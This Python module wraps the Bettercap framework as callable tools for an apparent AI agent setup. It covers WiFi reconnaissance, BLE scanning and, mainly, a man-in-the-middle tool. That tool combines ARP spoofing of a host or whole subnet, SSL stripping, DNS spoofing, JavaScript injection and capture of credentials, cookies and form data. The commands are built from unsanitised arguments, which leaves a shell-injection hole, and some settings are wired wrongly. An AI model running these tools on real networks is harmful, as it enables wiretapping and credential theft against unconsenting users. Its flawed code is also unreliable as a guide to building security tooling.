"""
Bettercap - Network Attack and Monitoring Framework
====================================================

Bettercap is a powerful, flexible and portable framework for network attacks
and monitoring. Supports WiFi, Bluetooth/BLE, HID, Ethernet, and more.

PERFORMANCE: Network attacks are NOT cached as they involve live network
operations that must be executed fresh each time.
"""

from skynet.tools.common import run_command
from skynet.sdk.agents import function_tool


@function_tool
def bettercap_wifi_recon(
    interface: str,
    output_file: str = "",
    channel_hop: bool = True,
    channels: str = "",
    duration: int = 60,
    ctf=None
) -> str:
    """
    WiFi reconnaissance and network discovery with Bettercap.

    Passive and active WiFi scanning to discover networks, clients,
    and relationships. More modern alternative to airodump-ng.

    Args:
        interface: Wireless interface in monitor mode
        output_file: Save results to file (CSV/JSON format)
        channel_hop: Enable channel hopping
        channels: Specific channels to scan (e.g., "1,6,11")
        duration: Scan duration in seconds
        ctf: CTF context for execution

    Returns:
        str: Discovered networks and clients

    Examples:
        # Quick WiFi scan
        bettercap_wifi_recon(
            interface="wlan0mon",
            duration=30
        )

        # Scan specific channels
        bettercap_wifi_recon(
            interface="wlan0mon",
            channels="1,6,11",
            duration=60
        )

        # Long-term monitoring with output
        bettercap_wifi_recon(
            interface="wlan0mon",
            output_file="/tmp/wifi-recon.json",
            duration=300
        )

        # All channels scan
        bettercap_wifi_recon(
            interface="wlan0mon",
            channel_hop=True,
            duration=120
        )

    Caplets (Bettercap Scripts):
        wifi-recon.cap:
            - WiFi reconnaissance
            - Network and client discovery
            - Relationship mapping

    Output Information:
        - SSID and BSSID
        - Signal strength (RSSI)
        - Encryption type
        - Connected clients
        - Client-AP associations
        - Probe requests

    Security Note:
        Passive scanning is low-risk and quiet. Active probing
        may be detected. Monitor mode required for packet capture.
    """
    # Create bettercap caplet script
    caplet = []
    caplet.append(f"set wifi.interface {interface}")

    if not channel_hop:
        caplet.append("set wifi.hop.enabled false")

    if channels:
        caplet.append(f"set wifi.hop.channels {channels}")

    caplet.append("wifi.recon on")

    if output_file:
        caplet.append(f"set wifi.handshakes.file {output_file}")

    caplet.append(f"sleep {duration}")
    caplet.append("wifi.show")
    caplet.append("wifi.recon off")

    # Write caplet to temp file
    caplet_content = "\\n".join(caplet)
    command = f'echo "{caplet_content}" | bettercap -iface {interface} -eval'

    return run_command(command, ctf=ctf)


@function_tool
def bettercap_mitm_attack(
    interface: str,
    target_ip: str = "",
    gateway_ip: str = "",
    capture_output: str = "",
    sniff_http: bool = True,
    sniff_https: bool = False,
    spoof_dns: str = "",
    javascript_injection: str = "",
    duration: int = 300,
    ctf=None
) -> str:
    """
    Man-in-the-Middle attack with traffic interception.

    Performs ARP spoofing to position between target and gateway,
    intercepting and analyzing traffic. Can inject payloads and
    capture credentials.

    Args:
        interface: Network interface (e.g., eth0, wlan0)
        target_ip: Target IP or range (e.g., "192.168.1.100" or "192.168.1.0/24")
        gateway_ip: Gateway IP address
        capture_output: File to save captured traffic (PCAP)
        sniff_http: Capture HTTP credentials and traffic
        sniff_https: Attempt HTTPS interception (requires SSL strip)
        spoof_dns: DNS spoofing rules (domain:ip format)
        javascript_injection: JavaScript code to inject into pages
        duration: Attack duration in seconds
        ctf: CTF context for execution

    Returns:
        str: Captured traffic and credentials

    Examples:
        # Basic MITM with HTTP sniffing
        bettercap_mitm_attack(
            interface="eth0",
            target_ip="192.168.1.100",
            gateway_ip="192.168.1.1",
            duration=300
        )

        # Whole subnet MITM
        bettercap_mitm_attack(
            interface="wlan0",
            target_ip="192.168.1.0/24",
            gateway_ip="192.168.1.1",
            sniff_http=True,
            capture_output="/tmp/mitm-capture.pcap"
        )

        # DNS spoofing attack
        bettercap_mitm_attack(
            interface="eth0",
            target_ip="192.168.1.50",
            gateway_ip="192.168.1.1",
            spoof_dns="*.google.com:192.168.1.200",
            duration=600
        )

        # JavaScript injection
        bettercap_mitm_attack(
            interface="wlan0",
            target_ip="192.168.1.100",
            gateway_ip="192.168.1.1",
            javascript_injection="alert('Compromised!');",
            duration=300
        )

        # HTTPS interception (SSL strip)
        bettercap_mitm_attack(
            interface="eth0",
            target_ip="192.168.1.100",
            gateway_ip="192.168.1.1",
            sniff_http=True,
            sniff_https=True,
            duration=600
        )

    MITM Attack Types:

    ARP Spoofing:
        - Poisons ARP cache
        - Redirects traffic through attacker
        - Transparent to user

    DNS Spoofing:
        - Redirects domain lookups
        - Phishing attacks
        - Traffic redirection

    SSL Stripping:
        - Downgrades HTTPS to HTTP
        - Intercepts "secure" traffic
        - Modern browsers have protections

    Captured Data:
        - HTTP credentials
        - Cookies and sessions
        - POST data
        - URLs visited
        - Form submissions
        - API requests

    Modules:

    net.probe:
        - Discover hosts on network
        - Identify active IPs

    net.recon:
        - Continuous network reconnaissance
        - Monitor new devices

    arp.spoof:
        - ARP poisoning
        - Traffic redirection

    net.sniff:
        - Packet capture
        - Credential extraction

    http.proxy:
        - HTTP traffic interception
        - JavaScript injection
        - Response modification

    dns.spoof:
        - DNS response manipulation
        - Domain redirection

    Detection Risk:
        High - MITM attacks are detectable by:
        - ARP cache inspection (duplicate IPs)
        - Network monitoring tools
        - IDS/IPS systems
        - HTTPS warnings (SSL strip)
        - Slow network performance

    Countermeasures (Defensive):
        - Static ARP entries
        - HTTPS Everywhere
        - VPN encryption
        - Network segmentation
        - IDS deployment

    Legal Warning:
        MITM attacks intercept private communications.
        Illegal without authorization. Can constitute:
        - Wiretapping
        - Computer fraud
        - Identity theft
        Use ONLY on authorized networks with written permission.
    """
    caplet = []
    caplet.append(f"set arp.spoof.targets {target_ip}" if target_ip else "# Target all")

    if gateway_ip:
        caplet.append(f"set arp.spoof.internal false")

    # Enable reconnaissance
    caplet.append("net.probe on")
    caplet.append("net.recon on")

    # ARP spoofing
    caplet.append("arp.spoof on")

    # Packet capture
    if capture_output:
        caplet.append(f"set net.sniff.output {capture_output}")
        caplet.append("net.sniff on")

    # HTTP sniffing
    if sniff_http:
        caplet.append("set http.proxy.sslstrip true")
        caplet.append("http.proxy on")

    # HTTPS interception
    if sniff_https:
        caplet.append("set https.proxy.sslstrip true")

    # DNS spoofing
    if spoof_dns:
        caplet.append(f"set dns.spoof.domains [{spoof_dns}]")
        caplet.append("dns.spoof on")

    # JavaScript injection
    if javascript_injection:
        caplet.append(f"set http.proxy.script {javascript_injection}")

    caplet.append(f"sleep {duration}")

    # Cleanup
    caplet.append("arp.spoof off")
    if sniff_http:
        caplet.append("http.proxy off")
    if capture_output:
        caplet.append("net.sniff off")

    caplet_content = "\\n".join(caplet)
    command = f'echo "{caplet_content}" | bettercap -iface {interface} -eval'

    return run_command(command, ctf=ctf)


@function_tool
def bettercap_ble_scan(
    duration: int = 60,
    show_duplicates: bool = False,
    show_lost: bool = False,
    ctf=None
) -> str:
    """
    Bluetooth Low Energy device discovery and enumeration.

    Scans for BLE devices, discovers services, and enumerates
    characteristics. Useful for IoT security assessment.

    Args:
        duration: Scan duration in seconds
        show_duplicates: Show duplicate advertisements
        show_lost: Show when devices are lost
        ctf: CTF context for execution

    Returns:
        str: Discovered BLE devices and services

    Examples:
        # Basic BLE scan
        bettercap_ble_scan(duration=30)

        # Detailed BLE scan
        bettercap_ble_scan(
            duration=120,
            show_duplicates=True,
            show_lost=True
        )

        # Quick IoT device discovery
        bettercap_ble_scan(duration=60)

    Discovered Information:
        - Device MAC addresses
        - Device names
        - RSSI (signal strength)
        - Services (UUIDs)
        - Characteristics
        - Manufacturer data

    Common BLE Devices:
        - Fitness trackers
        - Smart watches
        - IoT sensors
        - Smart locks
        - Medical devices
        - Beacons
        - Smart home devices

    BLE Attack Surface:
        - Unencrypted communications
        - Weak pairing
        - Open characteristics
        - Information disclosure
        - Replay attacks

    Security Note:
        BLE scanning is passive and low-risk. Simply listens for
        advertisements. Active enumeration may be detected by target.
    """
    caplet = []
    caplet.append("ble.recon on")

    if show_duplicates:
        caplet.append("set ble.show.duplicates true")

    if show_lost:
        caplet.append("set ble.show.lost true")

    caplet.append(f"sleep {duration}")
    caplet.append("ble.show")
    caplet.append("ble.recon off")

    caplet_content = "\\n".join(caplet)
    command = f'echo "{caplet_content}" | bettercap -eval'

    return run_command(command, ctf=ctf)
